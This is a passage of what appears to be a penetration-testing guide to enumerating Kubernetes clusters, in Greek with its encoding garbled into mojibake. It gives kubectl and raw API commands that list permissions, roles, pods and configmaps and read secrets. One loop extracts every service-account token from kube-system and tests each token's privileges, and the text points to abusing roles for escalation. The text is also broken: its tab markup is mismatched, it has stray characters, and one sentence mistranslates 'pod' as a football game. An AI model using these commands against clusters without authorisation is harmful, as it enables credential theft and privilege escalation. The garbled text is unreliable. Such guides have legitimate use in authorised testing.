--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Î›Î®ÏˆÎ· Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Ï‰Î½ Î ÏŒÏÏ‰Î½

ÎœÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î¸Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### Î›Î®ÏˆÎ· Î¤ÏÎµÏ‡Î¿Ï…ÏƒÏÎ½ Î ÏÎ¿Î½Î¿Î¼Î¹ÏÎ½

{% tabs %}
{% tab title="kubectl" %}Î“Î¹Î± Î½Î± Î»Î¬Î²ÎµÏ„Îµ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¹Ï‚ Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎµÏ‚ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÏƒÎ±Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `kubectl auth can-i`. Î‘Ï…Ï„Î® Î· ÎµÎ½Ï„Î¿Î»Î® ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Î±Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î¿ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î¼Î¹Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± ÏƒÎµ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï„Î¿Ï… Kubernetes. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `kubectl auth can-i create pods` Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î¿ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ pods. Î‘Î½ Î· ÎµÎ½Ï„Î¿Î»Î® ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ "yes", Ï„ÏŒÏ„Îµ Î­Ï‡ÎµÏ„Îµ Ï„Î¿ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î±, ÎµÎ½Ï Î±Î½ ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ "no", Ï„ÏŒÏ„Îµ Î´ÎµÎ½ Î­Ï‡ÎµÏ„Îµ Ï„Î¿ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î±. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÏ€Î¹Î»Î¿Î³Î® `--as` Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÎ½ÏŒÏ‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Î® ÏÏŒÎ»Î¿Ï…. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `kubectl auth can-i create pods --as system:admin` Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Î¿ ÏÏŒÎ»Î¿Ï‚ "system:admin" Î­Ï‡ÎµÎ¹ Ï„Î¿ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ pods.
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

ÎˆÎ½Î±Ï‚ Î¬Î»Î»Î¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î¬ ÏƒÎ±Ï‚ ÎµÎ¯Î½Î±Î¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î³Î¹Î± Ï„Î¿ **Kubernetes RBAC** ÏƒÏ„Î¿:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Î‘Ï†Î¿Ï Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï€Î¿Î¹Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±** Î­Ï‡ÎµÏ„Îµ, ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ»Î¯Î´Î± Î³Î¹Î± Î½Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÏÏƒÎµÏ„Îµ **Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ** Î³Î¹Î± Î½Î± Î±Î½Î±Î²Î±Î¸Î¼Î¯ÏƒÎµÏ„Îµ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î¬ ÏƒÎ±Ï‚:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Î›Î®ÏˆÎ· Î¬Î»Î»Ï‰Î½ ÏÏŒÎ»Ï‰Î½

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Î›Î®ÏˆÎ· Î¿Î½Î¿Î¼Î¬Ï„Ï‰Î½ Ï‡ÏÏÏ‰Î½ Î¿Î½Î¿Î¼Î¬Ï„Ï‰Î½

Î¤Î¿ Kubernetes Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ **Ï€Î¿Î»Î»Î±Ï€Î»Î¬ ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ¬ clusters** Ï€Î¿Ï… Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ Î¯Î´Î¹Î¿ Ï†Ï…ÏƒÎ¹ÎºÏŒ cluster. Î‘Ï…Ï„Î¬ Ï„Î± ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ¬ clusters Î¿Î½Î¿Î¼Î¬Î¶Î¿Î½Ï„Î±Î¹ **Î¿Î½ÏŒÎ¼Î±Ï„Î± Ï‡ÏÏÏ‰Î½ Î¿Î½Î¿Î¼Î¬Ï„Ï‰Î½**.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### Î›Î®ÏˆÎ· Î¼Ï…ÏƒÏ„Î¹ÎºÏÎ½

{% tabs %}
{% tab title="kubectl" %}Î“Î¹Î± Î½Î± Î»Î¬Î²ÎµÏ„Îµ Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ ÎµÎ½ÏŒÏ‚ Ï€ÏŒÏÎ¿Ï…, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `kubectl get secrets`. Î‘Ï…Ï„Î® Î· ÎµÎ½Ï„Î¿Î»Î® Î¸Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ Î¼Î¹Î± Î»Î¯ÏƒÏ„Î± Î¼Îµ ÏŒÎ»Î± Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Ï€Î¿Ï… Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ ÏƒÏ„Î¿ cluster. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ Ï„Î¿Î½ Ï€ÏŒÏÎ¿ Î³Î¹Î± Ï„Î¿Î½ Î¿Ï€Î¿Î¯Î¿ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î»Î¬Î²ÎµÏ„Îµ Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÏ€Î¹Î»Î¿Î³Î® `--namespace` ÎºÎ±Î¹ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Ï€ÏŒÏÎ¿Ï…. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:

```bash
kubectl get secrets --namespace=default
kubectl get secrets --namespace=default -o json
kubectl get secrets --namespace=default -o yaml
```

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `kubectl describe secret` Î³Î¹Î± Î½Î± Î»Î¬Î²ÎµÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:

```bash
kubectl describe secret <secret_name> --namespace=default
```

Î‘Ï…Ï„Î® Î· ÎµÎ½Ï„Î¿Î»Î® Î¸Î± ÎµÎ¼Ï†Î±Î½Î¯ÏƒÎµÎ¹ Ï„Î¹Ï‚ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ Ï„Î¿Ï… ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿Ï… Î¼Ï…ÏƒÏ„Î¹ÎºÎ¿Ï, ÏŒÏ€Ï‰Ï‚ Ï„Î¿Î½ Ï„ÏÏ€Î¿ Ï„Î¿Ï…, Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÎºÎ±Î¹ Î¬Î»Î»ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼ÎµÏ‚ Î³Î¹Î± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÏ€Î¹Î¸Î­ÏƒÎµÏ‰Î½.{% endtab %}
{% endtabs %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Î•Î¬Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¹Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î³ÏÎ±Î¼Î¼Î­Ï‚ Î³Î¹Î± Î½Î± Ï€Î¬ÏÎµÏ„Îµ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶Î¿Î½Ï„Î±Î¹ Î¼Îµ ÎºÎ¬Î¸Îµ Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Î›Î®ÏˆÎ· Î›Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏÎ½ Î¥Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚

ÎŒÏ€Ï‰Ï‚ ÏƒÏ…Î¶Î·Ï„Î®Î¸Î·ÎºÎµ ÏƒÏ„Î·Î½ Î±ÏÏ‡Î® Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÏƒÎµÎ»Î¯Î´Î±Ï‚, **ÏŒÏ„Î±Î½ Î­Î½Î± Ï€Î¿Î´Î¿ÏƒÏ†Î±Î¹ÏÎ¹ÎºÏŒ Ï€Î±Î¹Ï‡Î½Î¯Î´Î¹ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï„Î¿Ï… Î±Î½Î±Ï„Î¯Î¸ÎµÏ„Î±Î¹ Î­Î½Î±Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚**. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î· ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î® Ï„Ï‰Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏÎ½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚, Ï„Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Ï„Î¿Ï…Ï‚ ÎºÎ±Î¹ Ï„Î¿Ï… Ï„ÏŒÏ€Î¿Ï… ÏŒÏ€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î½Î± Î±Î½Î±Î²Î±Î¸Î¼Î¯ÏƒÎµÎ¹ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î¬ Ï„Î¿Ï….

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### Î›Î®ÏˆÎ· Î‘Î½Î±Ï€Ï„ÏÎ¾ÎµÏ‰Î½

ÎŸÎ¹ Î±Î½Î±Ï€Ï„ÏÎ¾ÎµÎ¹Ï‚ ÎºÎ±Î¸Î¿ÏÎ¯Î¶Î¿Ï…Î½ Ï„Î± **ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î±** Ï€Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„Î¿ÏÎ½**.
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Î›Î®ÏˆÎ· Pods

Î¤Î± Pods ÎµÎ¯Î½Î±Î¹ Ï„Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ¬ **containers** Ï€Î¿Ï… Î¸Î± **Ï„ÏÎ­Î¾Î¿Ï…Î½**.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Î›Î®ÏˆÎ· Î¥Ï€Î·ÏÎµÏƒÎ¹ÏÎ½

ÎŸÎ¹ **Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚** Ï„Î¿Ï… Kubernetes Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Î½Î± **ÎµÎºÎ¸Î­ÏƒÎ¿Ï…Î½ Î¼Î¹Î± Ï…Ï€Î·ÏÎµÏƒÎ¯Î± ÏƒÎµ Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ Î¸ÏÏÎ± ÎºÎ±Î¹ IP** (Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Ï‰Ï‚ Ï†Î¿ÏÏ„Î¯Î¿ Î¹ÏƒÎ¿ÏÏÎ¿Ï€Î·Ï„Î®Ï‚ Î³Î¹Î± Ï„Î± pods Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ†Î­ÏÎ¿Ï…Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ¬ Ï„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±). Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï€Î¿Ï Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î¬Î»Î»ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± ÎµÏ€Î¹Ï„ÎµÎ¸ÎµÎ¯Ï„Îµ.

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Î›Î®ÏˆÎ· ÎºÏŒÎ¼Î²Ï‰Î½

Î›Î¬Î²ÎµÏ„Îµ ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ **ÎºÏŒÎ¼Î²Î¿Ï…Ï‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î´Î¹Î±Î¼Î¿ÏÏ†Ï‰Î¸ÎµÎ¯ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ cluster**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Î›Î®ÏˆÎ· DaemonSets

Î¤Î± **DaemonSets** ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Î½Î± ÎµÎ¾Î±ÏƒÏ†Î±Î»Î¯ÏƒÎ¿Ï…Î¼Îµ ÏŒÏ„Î¹ Î­Î½Î± **ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ pod ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏƒÎµ ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ ÎºÏŒÎ¼Î²Î¿Ï…Ï‚** Ï„Î¿Ï… cluster (Î® ÏƒÏ„Î¿Ï…Ï‚ ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿Ï…Ï‚). Î•Î¬Î½ Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ Ï„Î¿ DaemonSet, Ï„Î± pods Ï€Î¿Ï… Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î¸Î± Î±Ï†Î±Î¹ÏÎµÎ¸Î¿ÏÎ½ ÎµÏ€Î¯ÏƒÎ·Ï‚.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Î›Î®ÏˆÎ· cronjob

ÎŸÎ¹ cron jobs ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Ï„Î¿Î½ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼ÏŒ Ï‡ÏÎ®ÏƒÎ·Ï‚ Ï„Î·Ï‚ ÏƒÏÎ½Ï„Î±Î¾Î·Ï‚ crontab Î³Î¹Î± Ï„Î·Î½ ÎµÎºÎºÎ¯Î½Î·ÏƒÎ· ÎµÎ½ÏŒÏ‚ pod Ï€Î¿Ï… Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î¹Î± ÎµÎ½Î­ÏÎ³ÎµÎ¹Î±.

{% tabs %}
{% tab title="kubectl" %}
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Î›Î®ÏˆÎ· Ï„Î¿Ï… configMap

Î¤Î¿ configMap Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï€Î¬Î½Ï„Î± Ï€Î¿Î»Î»Î­Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎºÎ±Î¹ Î±ÏÏ‡ÎµÎ¯Î± ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Î¹ ÏƒÏ„Î¹Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î¿ Kubernetes. Î£Ï…Î½Î®Î¸Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï€Î¿Î»Î»Î¿ÏÏ‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚, Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ ÎºÎ±Î¹ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ· ÎºÎ±Î¹ Ï„Î·Î½ ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ· ÏƒÎµ Î¬Î»Î»ÎµÏ‚ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ­Ï‚/ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ­Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚. 

{% tabs %}

{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
Î Î¬ÏÏ„Îµ "ÏŒÎ»Î±"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
{% endtab %}
{% endtabs %}

### **Î›Î®ÏˆÎ· ÎºÎ±Ï„Î±Î½Î±Î»ÏÏƒÎµÏ‰Î½ Pods**

{% tabs %}
{% tab title="kubectl" %}Î“Î¹Î± Î½Î± Î»Î¬Î²ÎµÏ„Îµ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¹Ï‚ ÎºÎ±Ï„Î±Î½Î±Î»ÏÏƒÎµÎ¹Ï‚ Ï„Ï‰Î½ Pods, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `kubectl` Î¼Îµ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `top`. Î Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬Î¶Î¿Î½Ï„Î±Î¹ Î¼ÎµÏÎ¹ÎºÎ¬ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Ï‡ÏÎ®ÏƒÎ·Ï‚:

```bash
# Î›Î®ÏˆÎ· ÎºÎ±Ï„Î±Î½Î¬Î»Ï‰ÏƒÎ·Ï‚ CPU Î³Î¹Î± ÏŒÎ»Î± Ï„Î± Pods
kubectl top pods --all-namespaces --sort-by=cpu

# Î›Î®ÏˆÎ· ÎºÎ±Ï„Î±Î½Î¬Î»Ï‰ÏƒÎ·Ï‚ Î¼Î½Î®Î¼Î·Ï‚ Î³Î¹Î± ÏŒÎ»Î± Ï„Î± Pods
kubectl top pods --all-namespaces --sort-by=memory

# Î›Î®ÏˆÎ· ÎºÎ±Ï„Î±Î½Î¬Î»Ï‰ÏƒÎ·Ï‚ CPU Î³Î¹Î± Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ Namespace
